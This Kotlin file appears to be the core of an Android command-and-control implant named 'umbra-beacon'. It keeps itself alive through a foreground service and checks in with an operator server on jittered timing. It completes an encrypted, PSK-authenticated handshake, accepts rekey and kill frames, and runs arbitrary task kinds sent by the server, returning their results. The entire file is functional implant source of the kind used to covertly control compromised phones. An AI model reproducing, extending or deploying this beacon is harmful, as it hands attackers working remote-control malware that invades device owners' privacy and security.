package io.umbra.beacon

import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

/**
 * Beacon loop: handshake, check-in, task execution, jittered sleep.
 *
 * Runs on its own thread; [BeaconService] owns the wake lock and foreground
 * notification so Android does not suspend the loop.
 */
class Beacon(
    private val config: BeaconConfig,
    private val listener: Listener? = null,
) {
    interface Listener {
        fun onLog(message: String)
        fun onStopped()
    }

    private val running = AtomicBoolean(false)
    private val lifecycle = Any()
    private var thread: Thread? = null

    // Owned by the beacon thread; @Volatile so stop() can abort a blocked read.
    @Volatile private var session: Session? = null
    @Volatile private var channel: Channel? = null

    private var sleep = config.sleepSec.toLong()
    private var jitter = config.jitterPercent
    private var failures = 0

    /**
     * Start the loop. Refuses if a thread still exists: two live loops would
     * share one session and violate the SEND-SERIAL invariant (frames must
     * leave in nonce order), so a restart waits for [stop] to have joined.
     */
    fun start() {
        synchronized(lifecycle) {
            if (running.get() || thread != null) return
            running.set(true)
            val t = Thread({ loop() }, "umbra-beacon")
            t.isDaemon = true
            thread = t
            t.start()
        }
    }

    /** Stop the loop, close the transport and wait for the thread to exit. */
    fun stop() {
        val t: Thread?
        synchronized(lifecycle) {
            running.set(false)
            t = thread
            thread = null
            channel?.close()
        }
        if (t != null && t !== Thread.currentThread()) {
            try {
                t.join(STOP_JOIN_MILLIS)
            } catch (_: InterruptedException) {
                // Propagate the interrupt only after the channel is closed.
            }
        }
    }

    fun isRunning(): Boolean = running.get()

    private fun log(msg: String) {
        listener?.onLog(msg)
    }

    private companion object {
        const val STOP_JOIN_MILLIS = 2000L

        /** Control frames (REKEY) tolerated before a TASK_BATCH. */
        const val MAX_CONTROL_FRAMES = 4
    }

    private fun loop() {
        while (running.get()) {
            try {
                if (cycle()) {
                    sleep = sleep.coerceIn(1, 86400)
                    val interval = nextIntervalSeconds()
                    log("beacon sleeping ${interval}s")
                    Thread.sleep(interval * 1000)
                }
            } catch (e: InterruptedException) {
                break
            } catch (t: Throwable) {
                failures += 1
                log("cycle failed (${failures}): ${t.message}")
                try {
                    Thread.sleep(backoffSeconds() * 1000)
                } catch (i: InterruptedException) {
                    break
                }
            }
        }
        synchronized(lifecycle) {
            running.set(false)
            thread = null
        }
        listener?.onStopped()
    }

    /** Exponential backoff, capped at 5 doublings (max 5 min). */
    private fun backoffSeconds(): Long = (sleep * (1L shl (failures.coerceAtMost(5)))).coerceAtMost(300)

    private fun nextIntervalSeconds(): Long {
        val base = sleep.toDouble()
        val j = jitter.coerceIn(0, 90) / 100.0
        val lo = (base * (1.0 - j)).coerceAtLeast(1.0)
        val hi = (base * (1.0 + j)).coerceAtLeast(lo)
        return (lo + (hi - lo) * Random.nextDouble()).toLong().coerceAtLeast(1)
    }

    /** One full beacon cycle. Returns false when the server told us to exit. */
    private fun cycle(): Boolean {
        openChannel()
        handshake()
        return checkin()
    }

    private fun openChannel() {
        channel?.close()
        channel = when (config.transport.lowercase()) {
            "http" -> HttpChannel(config.httpBaseUrl, config.httpPath)
            else -> TcpChannel(config.host, config.port).also {
                it.connect()
                log("tcp connected ${config.host}:${config.port}")
            }
        }
    }

    private fun handshake() {
        val suite = Wire.SUITE_AES256_GCM
        val ephemeral = Crypto.x25519Keypair()
        val clientNonce = Crypto.random(16)
        val ts = System.currentTimeMillis() / 1000
        val auth = Crypto.helloAuth(
            config.psk, Crypto.ROLE_AGENT, config.agentId.toByteArray(),
            ephemeral.publicRaw, clientNonce, ts, suite,
        )
        val hello = Upk.map(
            "v" to Upk.num(1),
            "role" to Upk.num(Crypto.ROLE_AGENT.toLong()),
            "id" to Upk.str(config.agentId),
            "pub" to Upk.bin(ephemeral.publicRaw),
            "cn" to Upk.bin(clientNonce),
            "ts" to Upk.num(ts),
            "suite" to Upk.num(suite.toLong()),
            "auth" to Upk.bin(auth),
            "meta" to SysInfo.meta(config.version),
        )
        val boot = Session.fromBootstrap(config.psk, suite, isServer = false)
        val frame = boot.sealValue(Wire.MSG_HELLO, hello)
        val ch = channel ?: throw TransportException("no channel")
        ch.writeFrame(frame)

        val (msgType, ack) = boot.openValue(ch.readFrame())
        if (msgType != Wire.MSG_HELLO_ACK) throw SessionException("expected HELLO_ACK")
        val serverPub = ack.field("pub")?.bytes() ?: throw SessionException("missing server key")
        val serverNonce = ack.field("sn")?.bytes() ?: throw SessionException("missing nonce")
        val sid = ack.field("sid")?.bytes() ?: throw SessionException("missing session id")
        val negSuite = ack.field("suite")?.long()?.toInt() ?: 0
        if (serverPub.size != 32 || serverNonce.size != 16 || sid.size != 16) {
            throw SessionException("malformed HELLO_ACK")
        }
        val want = Crypto.ackAuth(
            config.psk, config.agentId.toByteArray(), ephemeral.publicRaw,
            serverPub, clientNonce, serverNonce, sid, negSuite,
        )
        if (!Crypto.ctEq(want, ack.field("auth")?.bytes())) {
            throw SessionException("server authentication failed (wrong PSK?)")
        }
        val shared = Crypto.x25519Shared(ephemeral.privateKey, serverPub)
        val (prk, km) = Crypto.deriveSession(shared, clientNonce, serverNonce)
        session = Session(negSuite, isServer = false, bootstrap = false, material = km, prk = prk)
        ch.setSessionId(Crypto.hex(sid))

        ack.field("cfg")?.let { cfg ->
            cfg.field("sleep")?.long()?.let { sleep = it.coerceAtLeast(1) }
            cfg.field("jitter")?.long()?.let { jitter = it.toInt() }
        }
        log("handshake complete (suite=$negSuite)")
    }

    private fun checkin(): Boolean {
        val sess = session ?: throw SessionException("no session")
        val ch = channel ?: throw TransportException("no channel")
        val ts = System.currentTimeMillis() / 1000
        ch.writeFrame(sess.sealValue(Wire.MSG_CHECKIN, Upk.map("ts" to Upk.num(ts), "n" to Upk.num(0))))

        // The server may rotate keys immediately before the batch. A REKEY
        // frame is sealed with the OLD key set and is always followed by
        // TASK_BATCH, so read until the batch arrives (bounded) instead of
        // guessing a frame count.
        var batch: Upk? = null
        var rounds = 0
        while (true) {
            rounds += 1
            if (rounds > MAX_CONTROL_FRAMES) throw SessionException("too many control frames")
            val (msgType, body) = sess.openValue(ch.readFrame())
            when (msgType) {
                Wire.MSG_REKEY -> {
                    val seed = body.field("seed")?.bytes()
                    if (seed == null || seed.size != 32) throw SessionException("malformed REKEY seed")
                    sess.applyRekey(seed)
                    log("session rekeyed")
                }
                Wire.MSG_TASK_BATCH -> {
                    batch = body
                    break
                }
                Wire.MSG_KILL -> {
                    log("server sent KILL")
                    bye()
                    return false
                }
                else -> throw SessionException("expected TASK_BATCH, got ${msgType.toInt()}")
            }
        }

        val batchBody = batch ?: throw SessionException("no TASK_BATCH received")
        // Server-side policy wins over the compiled-in cadence.
        batchBody.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
        batchBody.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
        val tasks = batchBody.field("tasks")?.list() ?: emptyList()
        for (task in tasks) {
            val id = task.field("id")?.text() ?: ""
            val kind = task.field("kind")?.text() ?: ""
            val args = task.field("args") ?: Upk.map()
            log("task $id kind=$kind")
            when (kind) {
                "exit", "kill" -> {
                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run(kind, args).toValue(id)))
                    bye()
                    return false
                }
                "sleep" -> {
                    args.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
                    args.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run("sleep", args).toValue(id)))
                }
                else -> {
                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run(kind, args).toValue(id)))
                }
            }
        }
        bye()
        failures = 0
        return true
    }

    private fun bye() {
        try {
            val sess = session
            val ch = channel
            if (sess != null && ch != null) {
                ch.writeFrame(sess.sealValue(Wire.MSG_BYE, Upk.map()))
                ch.flush()
            }
        } catch (_: Throwable) {
        } finally {
            channel?.close()
            session = null
        }
    }
}

/** Build-time configuration, injected by Gradle from the environment. */
data class BeaconConfig(
    val host: String,
    val port: Int,
    val psk: ByteArray,
    val agentId: String,
    val transport: String,
    val httpBaseUrl: String,
    val httpPath: String,
    val sleepSec: Int,
    val jitterPercent: Int,
    val version: String,
)
